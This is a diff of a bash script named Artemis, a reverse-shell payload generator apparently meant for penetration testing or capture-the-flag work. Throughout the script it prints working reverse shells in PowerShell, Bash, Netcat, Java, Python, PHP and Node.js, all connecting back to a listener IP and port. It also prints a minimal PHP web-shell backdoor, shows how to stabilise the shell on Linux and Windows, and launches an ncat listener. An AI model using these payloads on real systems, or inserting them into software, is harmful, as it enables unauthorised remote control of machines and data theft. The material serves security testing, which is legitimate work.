@@ -3,7 +3,6 @@
 #To-DO: Add Ruby & Perl payloads
 line="============================================================"
 listen=""
-opt=""
 
 Help()
 {
@@ -15,21 +14,24 @@ Artemis will run in interactive mode unless required arguments are supplied.
 	-i <IP_ADDRESS>: Your listener's IP Address
 	-p <PORT>: Your listener's port
 	-l: Start a listener using specified interface and port
-	-t <TARGET_OS>: Specify the target OS for Web shell payloads & for stabilization tips [win/nix]
+	-t <TARGET_OS>: Specify the target OS for Web shell payloads & for stabilization tips
 	-s <PAYLOAD>: Specify the type of Reverse shell to generate
 
 [Payloads]
 	ps: PowerShell
 	bash
-	nc: Netcat (*nix targets)
+	nc: Netcat [nix]
 	java
-	py: Python (*nix targets)
-	php: (*nix targets)
-	node: Node.js (*nix targets)
+	py: Python [nix]
+	php: [nix]
+	node: Node.js [nix]
+
+[Target OS]
+	win: Windows
+	nix: Linux & other Unix-like operating systems
 
 [Usage]
 	artemis -i 10.10.144.68 -p 443 -s php -t nix -l
-	artemis -a
 
 [Troubleshooting]
 	If you're having trouble catching a shell, try the following steps-
@@ -48,7 +50,7 @@ PowerSHELL()
 
   ops='$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text); $EncodedText =[Convert]::ToBase64String($Bytes); $EncodedText'
 
-  payload=$(echo -n "$text; $ops" | pwsh -Command -)
+  payload=$(echo -n "$text;$ops" | pwsh -Command - | tr -d '\n')
 }
 
 while getopts "hi:p:ls:t:" option; do
@@ -75,32 +77,50 @@ while getopts "hi:p:ls:t:" option; do
 done
 
 if [[ -z "$host" ]]; then
-  echo -e "\nThe following interfaces have been detected:\n"
+  echo -e "\nThe following interfaces have been detected\n"
   ip -c a
   echo -e "\nEnter your IP Address: "
   read host
-  echo -e "$line"
 fi
 
 if [[ -z "$port" ]]; then
   echo "Enter the Listener's port number"
   read port
-  echo -e "$line"
 fi
 
 if [[ -z "$shell" ]]; then
   cat <<EOF
 Select an operation:
-
-[1] PowerShell
-[2] Bash
-[3] Netcat
-[4] Java
-[5] Python
-[6] PHP
-[7] Node.js
+	[1] PowerShell
+	[2] Bash
+	[3] Netcat
+	[4] Java
+	[5] Python
+	[6] PHP
+	[7] Node.js
 EOF
   read shell
+fi
+
+if [[ -z "$target" ]]; then
+  while :; do
+    cat <<EOF
+
+Select your target's OS:
+	[1] Linux Target
+	[2] Windows Target
+EOF
+    read target
+    if [[ "$target" == "1" ]]; then
+      target="nix"
+      break
+    elif [[ "$target" == "2" ]]; then
+      target="win"
+      break
+    else
+      echo -e "\n[Invalid selection]\nEnter either 1 or 2 for Linux or Windows\n"
+    fi
+  done
 fi
 
 case "$shell" in
@@ -110,7 +130,7 @@ case "$shell" in
     cat <<EOF
 $line
 
-[PowerShell $host:$port] 
+[PowerShell | $host:$port] 
 
 The basic payload is more reliable, but it may not run as a 64-bit process depending on the context that the payload is executed in
 
@@ -139,7 +159,7 @@ EOF
     cat <<EOF
 $line
 
-[Bash $host:$port]
+[Bash | $host:$port]
 
 URL-Encoding the basic payload can break it. Try the B64 payload if you need to URL-Encode it, or bypass filters
 
@@ -158,56 +178,71 @@ echo $b64|base64 -d|bash
 EOF
     ;;
   nc|3)
-    echo -e "\nOutputting Netcat payloads for a Linux target using $host:$port\n\n[!] Tip: Named Pipe Payload is preferred and Alternate Payload only works for certain versions of Netcat\n\n"
+    cat <<EOF
+$line
 
-    echo -e "Named Pipe Payload:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f\n\n"
+[Netcat | $host:$port]
 
-    echo -e "Alternate Payload:\nnc -e /bin/sh $host $port"
+Named Pipe Payload is more stable. Alternate Payload only works for certain versions of Netcat
+
+$line
+
+{Named Pipe Payload}
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f
+
+$line
+
+{Alternate Payload}
+
+nc -e /bin/sh $host $port
+
+EOF
     ;;
   java|4)
-    if [[ -z "$target" ]]; then
-      echo -e "Specify the target's OS:\n[1] Linux\n[2]Windows\n"
-      read opt
-
-      if [[ "$opt" == "1" ]]; then
-        target="nix"
-      elif [[ "$opt" == 2 ]]; then
-        target="win"
-      else
-        echo -e "\nYou did not select a valid option\nExitting\n"
-        exit
-      fi
-    fi
-
     if [[ "$target" == "nix" ]]; then
-      echo -e "\nOutputting a Java payload for Linux target using $host:$port\n\n"
+      cat <<EOF
+$line
 
-      echo "r = Runtime.getRuntime()"
-      echo "p = r.exec([\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/$host/$port; cat <&5 | while read value; do \\\$value 2>&5 >&5; done\"] as String[])"
-      echo "p.waitFor()"
+[Java | Linux | $host:$port]
 
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/$host/$port; cat <&5 | while read value; do \\\$value 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+EOF
     elif [[ "$target" == "win" ]]; then
       PowerSHELL
-      echo -e "\nOutputting a Java payload for Windows target using $host:$port\n\n"
-      echo -e "$line\nWARNING: Verify this works with the space after payload / before the quotes in line 2. The PowerSHELL function adds the space\n$line"
-      echo "r = Runtime.getRuntime()"
-      echo -n "p = r.exec([\"powershell.exe\", \"-enc\","; echo -n \"$payload\"; echo "] as String[])"
-#     echo "p = r.exec([\"powershell.exe\", \"-enc\", \"$payload\"] as String[])"
-      echo "p.waitFor()"
+      cat <<EOF
+$line
+
+[Java | Windows | $host:$port]
+
+r = Runtime.getRuntime()
+p = r.exec(["powershell.exe", "-enc", "$payload"] as String[])
+p.waitFor()
+
+EOF
     fi
     ;;
   py|5)
-    echo -e "\n[!] Tip: Depending on the target, you may need to substitute 'python3' for 'python' or 'python2'. This payload is for a Linux target.\n\n"
-    echo -e "Outputting a Python payload for $host:$port\n"
+    cat <<EOF
+$line
 
-    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+[Python | Linux | $host:$port]
+
+You may need to substitute 'python3' for 'python' or 'python2'
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$host",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+EOF
     ;;
   php|6)
-    #Quotes around EOF means nothing will be evaluated (i.e., backticks)
+    echo -e "\n$line\n"
     cat <<'EOF'
-[Generic Web shell]
+[PHP | Generic Backdoor]
 
-[!] Tip: This is the smallest possible payload, & it should work on any PHP server.
+This is the smallest possible payload, & it should work on any PHP server.
 
 If you're adding the payload to an existing file, append the PHP closing tags ?>
 
@@ -217,18 +252,35 @@ Navigate to the file's URL to execute commands (e.g. https://example.com/shell.p
 
 <?=`$_GET[0]`
 EOF
-    echo -e "$line\n[Linux Payloads]\n\n"
-    echo -e "[!] Tip: You can use PHP to execute other payloads by placing them inside the exec() or system() functions (e.g. for a Windows Target).\n"
-    echo -e "Outputting PHP payloads for $host:$port\n\n\n{Basic Payload: String}\n"
+    cat <<EOF
+$line
 
-    echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-    echo -e "\n\n{Alternate Payload: PHP tags}\n"
-    echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\");?>"
+[PHP | Linux | $host:$port]\n\n"
+
+[!] Tip: You can use PHP to execute other payloads by placing them inside the exec() or system() functions (e.g. for a Windows Target)
+
+{CLI Payload}
+
+php -r '\$sock=fsockopen("$host",$port);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+$line
+
+{Tag Payload}
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'");?>
+
+EOF
     ;;
 
   node|7)
-    echo -e "\nOutputting Node.js Payload for $host:$port\n\n"
-    echo "require('child_process').exec('bash -i >& /dev/tcp/$host/$port 0>&1');"
+    cat <<EOF
+$line
+
+[Node.js | Linux | $host:$port]
+
+require('child_process').exec('bash -i >& /dev/tcp/$host/$port 0>&1');
+
+EOF
     ;;
 
   *)
@@ -238,33 +290,10 @@ EOF
 esac
 echo -e "$line"
 
-if [[ -z "$target" ]]; then
-  cat <<EOF
-[Stabilization]
+case "$target" in
+  nix)
+    cat <<EOF
 
-Select your target's OS:
-
-	[0] Skip Stabilization
-	[1] Linux Target
-	[2] Windows Target
-EOF
-  read opt
-  if [[ "$opt" == "0" ]]; then
-    target="skip"
-  elif [[ "$opt" == "1" ]]; then
-    target="nix"
-  elif [[ "$opt" == "2" ]]; then
-    target="win"
-  else
-    echo -e "\nYou did not select a valid option\n"
-  fi
-fi
-
-if [[ "$target" == "skip" ]]; then
-  echo -e "\nSkipping...\n$line"
-
-elif [[ "$target" == "nix" ]]; then
-  cat <<EOF
 [Stabilize Linux shell]
 
 [!] Tip: You may be able to create SSH Keys on the target machine and use them for an upgraded shell
@@ -295,9 +324,10 @@ EOF
 #	    fg
 #	  E) Set Reverse Shell Terminal Size: Replace X & Y with the numbers from Step C
 #	    stty rows X columns Y
+    ;;
+  win)
+    cat <<'EOF'
 
-elif [[ "$target" == "win" ]]; then
-  cat <<'EOF'
 [Stabilize Windows shell]
 
 Use this shell to create a "Backup Shell" that you'll use. It may be more stable, but it's mainly in case you cause the shell to freeze while using it.
@@ -320,11 +350,13 @@ Use this shell to create a "Backup Shell" that you'll use. It may be more stable
 	  C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe \Users\Public\shell.ps1
 
 EOF
-else
-  echo -e "\nYou did not select a valid option\n"
-fi
+    ;;
+  *)
+    echo -e "\nYou did not select a valid option\n"
+    ;;
+esac
 
-echo -e "$line"
+echo -e "\n$line\n"
 
 if [[ "$listen" == "1" ]]; then
   rlwrap ncat -lvnp "$port"
